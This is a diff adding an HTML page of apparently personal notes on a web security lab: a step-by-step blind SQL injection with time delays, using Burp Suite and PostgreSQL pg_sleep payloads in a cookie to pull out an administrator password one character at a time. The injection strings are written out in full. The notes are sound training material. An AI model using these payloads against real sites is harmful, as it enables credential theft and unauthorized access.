@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Blind SQL injection with time delays and information retrieval</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Blind SQL injection with time delays and information retrieval</h1><br/><p><ol><li>Provided with storefront website, told there is a table called users containing columns username and password, told to find password for user administrator and sign in</li><li>Captured HTTP request on page reload in burpsuite and sent to Repeater</li><li>Appended &#39;;SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- to end of cookie TrackingId</li><li>Page slept for 10 seconds</li><li>Appended ‘; SELECT CASE WHEN (username=’administrator&#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</li><li>Page slept for 10 seconds</li><li>Appended ‘; SELECT CASE WHEN (username=’administrator&#39; AND LENGTH(password)&gt;1) THEN pg_sleep(6) ELSE pg_sleep(0) END FROM users--</li><li>Page slept for 6 seconds</li><li>Sent to Intruder, added positions around 1, number payload from 1-100</li><li>Observed time of day in responses and noticed 6 second difference stops after 19: </li></ol><img src="images/310-1.png" alt="images/310-1.png" /><ol><li>Discovered password is 20 digits long</li><li>Appened ‘; SELECT CASE WHEN (username=’administrator&#39; AND SUBSTRING(password, 1, 1)=&#39;a&#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</li><li>Set positions around a, set payload a-z and 0-9, used return category in results to find correct character</li><li>Repeated above 19 more times</li><li>Discovered credentials “administrator:v7u7wjzskqg3hu4tz2h1”</li><li>Successfully logged in and completed lab: </li></ol><img src="images/310-2.png" alt="images/310-2.png" /></p></div>
+</body>
+</html>
